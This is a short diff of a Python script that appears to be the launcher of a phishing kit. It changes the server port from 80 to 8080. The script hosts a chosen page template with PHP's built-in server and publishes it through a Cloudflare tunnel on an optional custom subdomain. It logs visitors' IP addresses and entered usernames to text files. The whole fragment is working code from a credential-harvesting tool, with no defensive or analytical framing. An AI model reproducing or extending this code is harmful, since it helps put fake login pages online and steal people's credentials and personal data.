@@ -117,20 +117,20 @@ Please Choose A Number To Host Template:
         print(colors.RED + "Invalid subdomain. Use only letters, numbers, dashes, or underscores." + colors.END)
         sys.exit(1)
 
-    print(colors.GREEN + "Starting Server at 127.0.0.1:80..." + colors.END)
+    print(colors.GREEN + "Starting Server at 127.0.0.1:8080..." + colors.END)
     print(f"Logs Can Be Found In sites/{choice}/ip.txt and sites/{choice}/usernames.txt" + colors.END)
 
     # Check dependencies before running
     check_dependencies()
 
     # Start PHP Server
-    php_cmd = f"php -t sites/{choice} -S 127.0.0.1:80 &"
+    php_cmd = f"php -t sites/{choice} -S 127.0.0.1:8080 &"
     subprocess.Popen(php_cmd, shell=True)
 
     # Start Cloudflare Tunnel
-    cf_cmd = "cloudflared tunnel --url http://127.0.0.1:80"
+    cf_cmd = "cloudflared tunnel --url http://127.0.0.1:8080"
     if subdom:
-        cf_cmd = f"cloudflared tunnel --hostname {subdom}.example.com --url http://127.0.0.1:80"
+        cf_cmd = f"cloudflared tunnel --hostname {subdom}.example.com --url http://127.0.0.1:8080"
 
     subprocess.Popen(cf_cmd, shell=True)
 
